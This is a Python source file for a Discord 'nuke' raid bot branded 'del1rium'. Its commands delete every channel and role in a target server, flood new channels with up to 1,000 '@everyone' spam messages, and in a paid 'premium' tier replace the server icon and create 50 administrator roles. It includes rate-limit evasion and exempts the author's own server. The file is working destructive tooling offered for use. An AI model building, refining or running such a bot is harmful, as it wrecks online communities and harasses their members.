import discord
from discord.ext import commands
import asyncio
import os
import aiohttp
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# --- CONFIGURATION ---
CENTRAL_SERVER_ID = 1453920087194206394  # IMPORTANT: REPLACE THIS with your server ID!!
PREMIUM_ROLE_ID = 1458177413325259035      # IMPORTANT: REPLACE THIS with your premium role ID!!
OWNER_ID = 1450919094202269881              # IMPORTANT: REPLACE THIS with your User ID!!

# --- DEFAULT NUKE CONFIGURATION ---
CHANNEL_NAME_CONFIG = "raid-by-del1rium"
SPAM_TEXT_CONFIG = "@everyone raid by del1rium https://discord.gg/cJJJWHfnn2"
RAID_ICON_URL = "https://i.imgur.com/x203v9a.jpeg"

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents)

# --- PREMIUM CHECK FUNCTION ---
def is_premium():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID:
            return True

        central_server = bot.get_guild(CENTRAL_SERVER_ID)
        if not central_server:
            await ctx.send("System Error: Could not verify premium status.")
            return False
        
        member_in_central = central_server.get_member(ctx.author.id)
        if not member_in_central or not any(role.id == PREMIUM_ROLE_ID for role in member_in_central.roles):
            await ctx.send("Access Denied: This is a premium command.")
            return False
        
        return True
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f'Raid Bot connected as {bot.user.name}')
    print(f'Owner ID: {OWNER_ID} | Protected Server: {CENTRAL_SERVER_ID}')
    print('Commands: :nuke, :premiumnuke, :nukeconfig')

# --- CONFIGURATION COMMAND ---
@bot.command(name='nukeconfig')
@commands.has_permissions(administrator=True)
async def nuke_config(ctx, channel_name: str, *, spam_text: str):
    if ctx.guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Command Disabled: This command cannot be used in the main server.")
        return

    global CHANNEL_NAME_CONFIG, SPAM_TEXT_CONFIG
    CHANNEL_NAME_CONFIG = channel_name
    SPAM_TEXT_CONFIG = spam_text
    
    await ctx.message.delete()
    embed = discord.Embed(title="Nuke Configuration Updated", color=discord.Color.blue())
    embed.add_field(name="Channel Name Format", value=f"`{channel_name}-X`", inline=False)
    embed.add_field(name="Spam Text", value=f"```{spam_text}```", inline=False)
    confirmation_msg = await ctx.send(embed=embed)
    await asyncio.sleep(10)
    await confirmation_msg.delete()

# --- NUKE COMMANDS (WITH NEW PARAMETERS) ---
@bot.command(name='nuke')
@commands.has_permissions(administrator=True)
async def nuke_normal(ctx):
    # Normal Nuke: 25 channels, 500 pings
    await execute_nuke(ctx, 25, 500, is_premium=False)

@bot.command(name='premiumnuke')
@commands.has_permissions(administrator=True)
@is_premium()
async def premium_nuke(ctx):
    # Premium Nuke: 50 channels, 1000 pings
    await execute_nuke(ctx, 50, 1000, is_premium=True)

# --- CENTRAL NUKE LOGIC (OPTIMIZED) ---
async def execute_nuke(ctx, num_channels, num_pings, is_premium: bool):
    guild = ctx.guild
    
    if guild.id == CENTRAL_SERVER_ID:
        await ctx.send("Action Blocked: Nuke commands are disabled in this server.")
        print(f"BLOCKED: {ctx.author.name} attempted a nuke in the protected server.")
        return

    command_type = "PREMIUM NUKE" if is_premium else "STANDARD NUKE"
    print(f"Initiating {command_type} in: {guild.name} by {ctx.author.name}")

    # Phase 1: Destructive actions in parallel
    print("Phase 1: Deleting channels/roles and executing premium actions...")
    destruction_tasks = [
        *(role.delete() for role in guild.roles if not role.is_default() and not role.managed),
        *(channel.delete() for channel in guild.channels)
    ]
    if is_premium:
        destruction_tasks.append(execute_premium_actions(guild))
    
    await asyncio.gather(*destruction_tasks, return_exceptions=True)
    print("Destruction phase completed.")

    # Phase 2: Channel creation and spamming
    print(f"Phase 2: Creating {num_channels} channels and initiating spam...")
    spam_tasks = [create_and_spam(guild, i, num_pings) for i in range(num_channels)]
    await asyncio.gather(*spam_tasks)
    
    print(f"{command_type} finished for {guild.name}.")

# --- HELPER FUNCTIONS (OPTIMIZED) ---
async def create_and_spam(guild, index, num_pings):
    """Creates a channel and starts the spam task for it."""
    try:
        channel = await guild.create_text_channel(f'{CHANNEL_NAME_CONFIG}-{index+1}')
        await spam_pings(channel, SPAM_TEXT_CONFIG, num_pings)
    except Exception:
        pass # Ignore errors if a channel can't be created

async def spam_pings(channel, spam_text, amount):
    """Optimized spam function using 'fire and forget'."""
    for _ in range(amount):
        try:
            # Create a task to send the message but don't wait for it
            asyncio.create_task(channel.send(spam_text))
            # Minimal sleep to prevent immediate rate-limit ban
            await asyncio.sleep(0.1)
        except Exception:
            break

async def execute_premium_actions(guild):
    """Executes all premium actions concurrently for max speed."""
    premium_tasks = [
        change_server_icon(guild),
        create_chaotic_roles(guild)
    ]
    await asyncio.gather(*premium_tasks, return_exceptions=True)

async def change_server_icon(guild):
    try:
        async with aiohttp.ClientSession() as session, session.get(RAID_ICON_URL) as resp:
            if resp.status == 200:
                await guild.edit(icon=await resp.read(), reason="Premium Nuke")
    except Exception: pass

async def create_chaotic_roles(guild):
    role_tasks = [guild.create_role(name=f"hacked-by-del1rium-{i}", permissions=discord.Permissions(administrator=True), color=discord.Color.random()) for i in range(50)]
    await asyncio.gather(*role_tasks, return_exceptions=True)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You must have administrator permissions to use this command.")
    elif isinstance(error, commands.CheckFailure):
        print(f"Premium access denied for user: {ctx.author.name}")
    else:
        print(f"An ignored command error occurred: {error}")

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("Error: DISCORD_TOKEN is not configured.")

